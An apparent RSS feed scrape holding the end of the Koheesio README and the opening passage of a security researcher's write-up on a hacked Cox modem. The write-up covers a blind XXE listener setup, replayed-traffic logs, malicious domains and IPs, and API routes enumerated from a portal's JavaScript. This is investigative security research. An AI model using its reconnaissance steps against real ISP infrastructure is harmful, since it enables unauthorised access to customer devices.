<td><a href="https://github.com/pypa/hatch"><img src="https://camo.githubusercontent.com/913a9419bb59f99a8378258a38e935948c906e1565b3a8a41fb8e1219d7bb680/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f2546302539462541352539412d48617463682d3430353162352e737667" alt="Hatch project" data-canonical-src="https://img.shields.io/badge/%F0%9F%A5%9A-Hatch-4051b5.svg"></a> <a href="https://github.com/astral-sh/ruff"><img src="https://camo.githubusercontent.com/18c26428c337f9d641fa09b629a3a03b514e8ac84b57974a0ed7d1b38e14e060/68747470733a2f2f696d672e736869656c64732e696f2f656e64706f696e743f75726c3d68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f61737472616c2d73682f727566662f6d61696e2f6173736574732f62616467652f76322e6a736f6e" alt="linting - Ruff" data-canonical-src="https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/astral-sh/ruff/main/assets/badge/v2.json"></a> <a href="https://github.com/python/mypy"><img src="https://camo.githubusercontent.com/da30df6e7fd8b77624a714a0abf60e9265b8ed07f842a3ab7dc7cbbcef581288/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f74797065732d4d7970792d626c75652e737667" alt="types - Mypy" data-canonical-src="https://img.shields.io/badge/types-Mypy-blue.svg"></a> <a href="https://numpydoc.readthedocs.io/en/latest/format.html" rel="nofollow"><img src="https://camo.githubusercontent.com/3b43ff97d2d36f56fd411cc1a5e131ec615ca816ed92c482556e778480ea3543/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f646f63737472696e672d6e756d7079646f632d626c7565" alt="docstring - numpydoc" data-canonical-src="https://img.shields.io/badge/docstring-numpydoc-blue"></a> <a href="https://github.com/psf/black"><img src="https://camo.githubusercontent.com/7d770c433d6198d89f8c1e2f187b904a9721d176259d0e97157337741cc8e837/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f636f64652532307374796c652d626c61636b2d3030303030302e737667" alt="code style - black" data-canonical-src="https://img.shields.io/badge/code%20style-black-000000.svg"></a> <a href="https://github.com/Nike-Inc/koheesio/blob/main/LICENSE.txt"><img src="https://camo.githubusercontent.com/3b6292ba7b832b6b3fda8c18eaca3c4351d1251ddaf70167664a2256b5d104f1/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f6c6963656e73652f4e696b652d496e632f6b6f68656573696f" alt="License - Apache 2.0" data-canonical-src="https://img.shields.io/github/license/Nike-Inc/koheesio"></a></td>
</tr>
</tbody>
</table>
<p dir="auto">Koheesio, named after the Finnish word for cohesion, is a robust Python framework for building efficient data pipelines.
It promotes modularity and collaboration, enabling the creation of complex pipelines from simple, reusable components.</p>
<p dir="auto">The framework is versatile, aiming to support multiple implementations and working seamlessly with various data
processing libraries or frameworks. This ensures that Koheesio can handle any data processing task, regardless of the
underlying technology or data scale.</p>
<p dir="auto">Koheesio uses <a href="https://github.com/Nike-Inc/koheesio/blob/main/docs/includes/glossary.md#pydantic">Pydantic</a> for strong typing, data validation, and settings management, ensuring a high level of type
safety and structured configurations within pipeline components.</p>
<p dir="auto">Koheesio's goal is to ensure predictable pipeline execution through a solid foundation of well-tested code and a rich
set of features, making it an excellent choice for developers and organizations seeking to build robust and adaptable
Data Pipelines.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">What sets Koheesio apart from other libraries?"</h2><a id="user-content-what-sets-koheesio-apart-from-other-libraries" aria-label="Permalink: What sets Koheesio apart from other libraries?&quot;" href="#what-sets-koheesio-apart-from-other-libraries"></a></p>
<p dir="auto">Koheesio encapsulates years of data engineering expertise, fostering a collaborative and innovative community. While
similar libraries exist, Koheesio's focus on data pipelines, integration with PySpark, and specific design for tasks
like data transformation, ETL jobs, data validation, and large-scale data processing sets it apart.</p>
<p dir="auto">Koheesio aims to provide a rich set of features including readers, writers, and transformations for any type of Data
processing. Koheesio is not in competition with other libraries. Its aim is to offer wide-ranging support and focus
on utility in a multitude of scenarios. Our preference is for integration, not competition...</p>
<p dir="auto">We invite contributions from all, promoting collaboration and innovation in the data engineering community.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Koheesio Core Components</h2><a id="user-content-koheesio-core-components" aria-label="Permalink: Koheesio Core Components" href="#koheesio-core-components"></a></p>
<p dir="auto">Here are the key components included in Koheesio:</p>
<ul dir="auto">
<li>
<p dir="auto"><strong>Step</strong>: This is the fundamental unit of work in Koheesio. It represents a single operation in a data pipeline,
taking in inputs and producing outputs.</p>
<div data-snippet-clipboard-copy-content="┌─────────┐        ┌──────────────────┐        ┌──────────┐
│ Input 1 │───────▶│                  ├───────▶│ Output 1 │
└─────────┘        │                  │        └────√─────┘
                   │                  │
┌─────────┐        │                  │        ┌──────────┐
│ Input 2 │───────▶│       Step       │───────▶│ Output 2 │
└─────────┘        │                  │        └──────────┘
                   │                  │
┌─────────┐        │                  │        ┌──────────┐
│ Input 3 │───────▶│                  ├───────▶│ Output 3 │
└─────────┘        └──────────────────┘        └──────────┘"><pre lang="text"><code>┌─────────┐        ┌──────────────────┐        ┌──────────┐
│ Input 1 │───────▶│                  ├───────▶│ Output 1 │
└─────────┘        │                  │        └────√─────┘
                   │                  │
┌─────────┐        │                  │        ┌──────────┐
│ Input 2 │───────▶│       Step       │───────▶│ Output 2 │
└─────────┘        │                  │        └──────────┘
                   │                  │
┌─────────┐        │                  │        ┌──────────┐
│ Input 3 │───────▶│                  ├───────▶│ Output 3 │
└─────────┘        └──────────────────┘        └──────────┘
</code></pre></div>
</li>
<li>
<p dir="auto"><strong>Context</strong>: This is a configuration class used to set up the environment for a Task. It can be used to share
variables across tasks and adapt the behavior of a Task based on its environment.</p>
</li>
<li>
<p dir="auto"><strong>Logger</strong>: This is a class for logging messages at different levels.</p>
</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Installation</h2><a id="user-content-installation" aria-label="Permalink: Installation" href="#installation"></a></p>
<p dir="auto">You can install Koheesio using either pip or poetry.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Using Pip</h3><a id="user-content-using-pip" aria-label="Permalink: Using Pip" href="#using-pip"></a></p>
<p dir="auto">To install Koheesio using pip, run the following command in your terminal:</p>

<p dir="auto"><h3 tabindex="-1" dir="auto">Using Hatch</h3><a id="user-content-using-hatch" aria-label="Permalink: Using Hatch" href="#using-hatch"></a></p>
<p dir="auto">If you're using Hatch for package management, you can add Koheesio to your project by simply adding koheesio to your
<code>pyproject.toml</code>.</p>
<div dir="auto" data-snippet-clipboard-copy-content="[dependencies]
koheesio = &quot;<version>&quot;"><pre>[<span>dependencies</span>]
<span>koheesio</span> = <span><span>"</span>&lt;version&gt;<span>"</span></span></pre></div>
<p dir="auto"><h3 tabindex="-1" dir="auto">Using Poetry</h3><a id="user-content-using-poetry" aria-label="Permalink: Using Poetry" href="#using-poetry"></a></p>
<p dir="auto">If you're using poetry for package management, you can add Koheesio to your project with the following command:</p>

<p dir="auto">or add the following line to your <code>pyproject.toml</code> (under <code>[tool.poetry.dependencies]</code>), making sure to replace <code>...</code> with the version you want to have installed:</p>
<div dir="auto" data-snippet-clipboard-copy-content="koheesio = {version = &quot;...&quot;}"><pre><span>koheesio</span> = {<span>version</span> = <span><span>"</span>...<span>"</span></span>}</pre></div>
<p dir="auto"><h3 tabindex="-1" dir="auto">Features</h3><a id="user-content-features" aria-label="Permalink: Features" href="#features"></a></p>
<p dir="auto">Koheesio also provides some additional features that can be useful in certain scenarios. These include:</p>
<ul dir="auto">
<li><strong>Spark Expectations</strong>: Available through the <code>koheesio.steps.integration.spark.dq.spark_expectations</code> module;
<ul dir="auto">
<li>Installable through the <code>se</code> extra.</li>
<li>SE Provides Data Quality checks for Spark DataFrames. For more information, refer to the <a href="https://engineering.nike.com/spark-expectations" rel="nofollow">Spark Expectations docs</a>.</li>
</ul>
</li>
</ul>
<ul dir="auto">
<li>
<p dir="auto"><strong>Box</strong>: Available through the <code>koheesio.steps.integration.box</code> module</p>
<ul dir="auto">
<li>Installable through the <code>box</code> extra.</li>
<li>Box is a cloud content management and file sharing service for businesses.</li>
</ul>
</li>
<li>
<p dir="auto"><strong>SFTP</strong>: Available through the <code>koheesio.steps.integration.spark.sftp</code> module;</p>
<ul dir="auto">
<li>Installable through the <code>sftp</code> extra.</li>
<li>SFTP is a network protocol used for secure file transfer over a secure shell.</li>
</ul>
</li>
</ul>
<blockquote>
<p dir="auto"><strong>Note:</strong><br>
Some of the steps require extra dependencies. See the <a href="#features">Features</a> section for additional info.<br>
Extras can be done by adding <code>features=['name_of_the_extra']</code> to the toml entry mentioned above</p>
</blockquote>
<p dir="auto"><h2 tabindex="-1" dir="auto">Contributing</h2><a id="user-content-contributing" aria-label="Permalink: Contributing" href="#contributing"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">How to Contribute</h3><a id="user-content-how-to-contribute" aria-label="Permalink: How to Contribute" href="#how-to-contribute"></a></p>
<p dir="auto">We welcome contributions to our project! Here's a brief overview of our development process:</p>
<ul dir="auto">
<li>
<p dir="auto"><strong>Code Standards</strong>: We use <code>pylint</code>, <code>black</code>, and <code>mypy</code> to maintain code standards. Please ensure your code passes these checks by running <code>make check</code>. No errors or warnings should be reported by the linter before you submit a pull request.</p>
</li>
<li>
<p dir="auto"><strong>Testing</strong>: We use <code>pytest</code> for testing. Run the tests with <code>make test</code> and ensure all tests pass before submitting a pull request.</p>
</li>
<li>
<p dir="auto"><strong>Release Process</strong>: We aim for frequent releases. Typically when we have a new feature or bugfix, a developer with
admin rights will create a new release on GitHub and publish the new version to PyPI.</p>
</li>
</ul>
<p dir="auto">For more detailed information, please refer to our <a href="https://github.com/Nike-Inc/koheesio/blob/main/docs/contribute.md">contribution guidelines</a>. We also adhere to
<a href="https://github.com/Nike-Inc/nike-inc.github.io/blob/master/CONDUCT.md">Nike's Code of Conduct</a> and <a href="https://www.clahub.com/agreements/Nike-Inc/fastbreak" rel="nofollow">Nike's Individual Contributor License Agreement</a>.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Additional Resources</h3><a id="user-content-additional-resources" aria-label="Permalink: Additional Resources" href="#additional-resources"></a></p>
<ul dir="auto">
<li><a href="https://help.github.com/">General GitHub documentation</a></li>
<li><a href="https://help.github.com/send-pull-requests/">GitHub pull request documentation</a></li>
<li><a href="https://nike-inc.github.io/" rel="nofollow">Nike OSS</a></li>
</ul>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Hacking millions of modems and investigating who hacked my modem (696 pts)]]></title>
            <link>https://samcurry.net/hacking-millions-of-modems</link>
            <guid>40570781</guid>
            <pubDate>Tue, 04 Jun 2024 04:46:58 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://samcurry.net/hacking-millions-of-modems">https://samcurry.net/hacking-millions-of-modems</a>, See on <a href="https://news.ycombinator.com/item?id=40570781">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><h2 id="introduction">Introduction</h2>
<p>Two years ago, something very strange happened to me while working from my home network. I was exploiting a blind XXE vulnerability that required an external HTTP server to smuggle out files, so I spun up an AWS box and ran a simple Python webserver to receive the traffic from the vulnerable server:</p>
<pre><code>python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
</code></pre>
<p>Once the webserver was running, I sent a cURL request from my home computer to make sure that it could receive external HTTP requests:</p>
<pre><code>curl "http://54.156.88.125:8000/test123"
</code></pre>
<p>Just a few seconds later, I saw the following log:</p>
<pre><code>98.161.24.100 - [16:32:12] "GET /test123 HTTP/1.1"
</code></pre>
<p>Perfect, this meant that I was able to receive network traffic on the box. Everything seemed good to go, but right as I switched back to exploiting the vulnerability, something very unexpected appeared in my log file:</p>
<pre><code>98.161.24.100 - [16:32:12] "GET /test123 HTTP/1.1"
159.65.76.209 - [16:32:22] "GET /test123 HTTP/1.1"
</code></pre>
<p>An unknown IP address had replayed the exact same HTTP request just 10 seconds later.</p>
<p>"Wow, that’s seriously weird," I thought. Somewhere, between my home network and the AWS box, someone had intercepted and replayed my HTTP traffic. This traffic should not be accessible. There is no intermediary between these two systems who should be seeing this. My immediate thought was that my computer had been hacked and that the hacker was actively monitoring my traffic.</p>
<p>To check if the same behavior occured on a different device, I pulled out my iPhone and typed in the URL into Safari. I sent the request, then peaked at my log file:</p>
<pre><code>98.161.24.100 - [16:34:04] "GET /uhhhh HTTP/1.1"
159.65.76.209 - [16:34:16] "GET /uhhhh HTTP/1.1"
</code></pre>
<p>The same unknown IP address had intercepted and replayed both HTTP requests from my computer and iPhone. Somehow, someone was intercepting and replaying the web traffic from likely every single device on my home network.</p>
<p>Panicked, I spun up a new AWS box running Nginx to make sure that the original instance hadn't been compromised somehow.</p>
<pre><code>sudo service nginx start
tail -f /var/log/nginx/access.log
</code></pre>
<p>I opened the URL once again from my iPhone and saw the exact same logs:</p>
<pre><code>98.161.24.100 - [16:44:04] "GET /whatisgoingon1234 HTTP/1.1"
159.65.76.209 - [16:44:12] "GET /whatisgoingon1234 HTTP/1.1"
</code></pre>
<p>Through what could only be my ISP, modem, or AWS being compromised, someone was intercepting and replaying my HTTP traffic immediately after I'd sent it. To eliminate the absurd idea that AWS had been compromised, I spun up a box on GCP instead and observed the same unknown IP address replaying my HTTP requests. It wasn’t AWS.</p>
<p>The only real option left was that my modem had been hacked, but who was the attacker? I queried the owner of the IP address and found that it belonged to DigitalOcean. Strange. That definitely didn't belong to my ISP.</p>
<h2 id="who-are-you-1596576209">Who are you, 159.65.76.209?</h2>
<p>To kick off an investigation, I sent the IP address to some friends who worked for threat intelligence companies. They sent me a link to the VirusTotal listing for the IP address which detailed all of the domains which resolved to the IP address over the past few years.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>Out of the last 5 domains that were tied to the IP address, 3 were phishing websites, and 2 were what appeared to be mail servers. The following domains all at one point in time resolved to the DigitalOcean IP address:</p>
<pre><code>regional.adidas.com.py (2019/11/26)
isglatam.online (2019/12/08)
isglatam.tk (2020/11/11)
mx12.limit742921.tokyo (2021/08/08)
mx12.jingoism44769.xyz (2022/04/12)
</code></pre>
<p>Two of the domains associated with the 159.65.76.209 IP address were <code>isglatam.online</code> and <code>isglatam.tk</code>. These were both at one point in time phishing websites for <code>isglatam.com</code>, a South American cybersecurity company.</p>
<p>After visiting the real ISG Latam website, we learned that they are based out of Paraguay and partnered with Crowdstrike, AppGate, Acunetix, DarkTrace, and ForcePoint. From a 10 minute read of everything, it appeared that the people who were intercepting my traffic had tried to phish ISG Latam using the same IP address.</p>
<h2 id="hackers-hacking-hackers">Hackers Hacking Hackers?</h2>
<p>Now this was odd. The IP address, just one year prior, was being used to host phishing infrastructure that targeted a South American cybersecurity company. Assuming that they have been in control of this IP address for 3 years, it would mean that they have used it for at least 2 different phishing campaigns and what appeared to be a C&amp;C server for router malware?</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>Through URLscan, I learned that the <code>isglatam.online</code> and <code>isglatam.tk</code> websites were hosting generic BeEF phishing sites that can historically be seen <a href="https://urlscan.io/result/52459337-0f2d-4b26-859f-4a6f4eafa6dd#transactions">here</a>.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>The signature of the attacker was super interesting, because they were doing a lot of different malicious activities from the same box and apparently had not gotten suspended in over 3 years. It was really hard to piece together their intent with the Adidas, ISG Latam, and modem hacking thing all coming from the same IP address. There was a chance that the IP had rotated between different owners over the years, but it didn't seem likely as the gaps in between everything were long and it was unlikely that it was immediately reassigned to another malicious party.</p>
<p>Realizing that the infected device was still running, I walked over, unplugged it, and placed it into a cardboard box.</p>
<h2 id="handing-over-evidence">Handing Over Evidence</h2>
<p>The modem that I had been using was the Cox Panoramic Wifi gateway. After learning that it was likely compromised, I went to the local Cox store to show them my device and ask for a new one.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>The one issue with this request was that in order for me to receive a new modem, I had to hand over the old one. Sadly, it wasn't actually my property — I was only <em>renting</em> it from the ISP. I explained to the employee how I wanted to keep and reverse engineer the device. Their eyes shot up a little bit. They were much less enthusiastic about giving it back to me.</p>
<p>“There’s no way I can keep it?” I asked. “No, we need to take your old one to give you a new one,” the ISP representative said. There was no budging. As much as I wanted to take it apart, dump the firmware, and see if there was any trace of whatever potentially compromised it, I had already passed the device off to the employee. I took my new device and left the store, disappointed that I wasn’t able to do anything more with it.</p>
<p>After setting up the new modem, the previous behavior completely stopped. My traffic was no longer being replayed. There was no "other IP" in the logs. Everything seemed fixed.</p>
<p>With a bit of dissapointment I concluded that the modem I no longer had access to was what had been compromised. Since I’d handed it over to the ISP and replaced the device, there wasn’t anything more that I could investigate besides maybe seeing if my computer had gotten hacked.</p>
<p>I gave up trying to figure it out. At least for the time being.</p>
<h2 id="three-years-later">Three Years Later</h2>
<p>In early 2024, almost three years later, I was on vacation with some friends who also worked in cybersecurity. We were having a conversation over dinner when I explained the story to them. Curious to learn more, they asked me for all of the details and thought it’d be fun to run their own investigation.</p>
<p>The first thing that caught their attention (having worked on more malware analysis a lot more than I had) was the format of the two mail server domains (<code>limit742921.tokyo</code> and <code>jingoism44769.xyz</code>). They pulled the IP address of the <code>mx1</code> subdomain for <code>limit742921.tokyo</code> and then ran a reverse IP search on all domains that had at one point in time pointed to that same IP address. There were over 1,000 domains that all followed the exact same pattern...</p>
<pre><code><span>{</span><span>"rrname"</span><span>:</span><span>"acquire543225.biz."</span><span>,</span><span>"rrtype"</span><span>:</span><span>"A"</span><span>,</span><span>"rdata"</span><span>:</span><span>"153.127.55.212"</span><span>}</span>
<span>{</span><span>"rrname"</span><span>:</span><span>"battery935904.biz."</span><span>,</span><span>"rrtype"</span><span>:</span><span>"A"</span><span>,</span><span>"rdata"</span><span>:</span><span>"153.127.55.212"</span><span>}</span>
<span>{</span><span>"rrname"</span><span>:</span><span>"grocery634272.biz."</span><span>,</span><span>"rrtype"</span><span>:</span><span>"A"</span><span>,</span><span>"rdata"</span><span>:</span><span>"153.127.55.212"</span><span>}</span>
<span>{</span><span>"rrname"</span><span>:</span><span>"seventy688181.biz."</span><span>,</span><span>"rrtype"</span><span>:</span><span>"A"</span><span>,</span><span>"rdata"</span><span>:</span><span>"153.127.55.212"</span><span>}</span>
</code></pre>
<p>Every single domain that was registered by the discovered IP address used the same naming convention:</p>
<pre><code>[word][6 numbers].[TLD]
</code></pre>
<p>Due to the mass-number of domains and algorithmic structure of the registered address, this appeared to be a domain generation algorithm used by malware operators to rotate the resolving address for the C&amp;C server for the purpose of obfuscation. There was a good chance that the IP address replaying my traffic was a C&amp;C server, and the two domains which I thought were mail servers were actually algorithmically generated pointers to the C&amp;C server.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>Something disappointing was that all of these domains were historical; the last one seen was registered on March 17, 2023. None of the hosts resolved to anything anymore, and we couldn’t seem to identify anything similar being registered to the same IP address.</p>
<p>Given that my new modem was the same model that had been compromised, I was curious if the attacker had found a way back in. From a quick Google search I’d learned that there were no public vulnerabilities for the model of modem that I had (even though it was now 3 years later) so if there was an exploit, they were doing a great job keeping it private.</p>
<p>The other option that seemed more-and-more likely was that they had exploited something outside of a generic router exploit. I was super curious to investigate this and try to brainstorm ways that my device could’ve been compromised.</p>
<h2 id="targeting-rest-apis-using-the-tr-069-protocol">Targeting REST APIs using the TR-069 Protocol</h2>
<p>After getting back home, a close friend had asked if I’d be able to help him move furniture into his new house. What this also meant was helping him transfer over his Cox modem. After connecting his device to the fiber line, I went ahead and called the ISP support and asked if they’d be able to push out an update to allow the device to work in the new location. The agent confirmed they could remotely update the device settings, including changing the WiFi password and viewing connected devices.</p>
<p>The ability of support agents to control devices really interested me, especially since they could update pretty much anything on the device. This extensive access was facilitated by a protocol known as TR-069, implemented in 2004, which allowed ISPs to manage devices within their own network via port 7547. This protocol had already been the subject of a few great DEF CON talks and wasn’t externally exposed, so I wasn’t super interested in bug hunting the protocol itself. What I was interested in, however, were the tools that the support agent was using to manage the device.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>To theorycraft a little bit, if I were a hacker who wanted to compromise my modem I'd likely target whatever infrastructure powered the support tools that the agents were using. There was probably some internal website for device management that support agents used, backed by an API that could execute arbitrary commands and change/view administrative settings of customer devices. If I could find some way to access this functionality, it might shed light on how I might have been originally hacked and patch out at least one method for someone to compromise my modem.</p>
<h2 id="hacking-millions-of-modems">Hacking Millions of Modems</h2>
<p>The first thing that I decided to look at was the Cox Business portal. This app had a ton of interesting functionality to remotely manage devices, set firewall rules, and monitor network traffic.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>Without actually having a Cox business account myself, I opened the login page for the portal and grabbed a copy of the <code>main.36624ed36fb0ff5b.js</code> file that powered the core functionality of the app. After beautifying it, I parsed out all of the routes and scrolled through them:</p>
<pre><code>/api/cbma/voicemail/services/voicemail/inbox/transcribeMessage/
/api/cbma/profile/services/profile/userroles/
/api/cbma/accountequipment/services/accountequipment/equipments/eligibleRebootDevice
/api/cbma/accountequipment/services/accountequipment/casedetail
/api/cbma/user/identity/services/useridentity/user/verifyContact
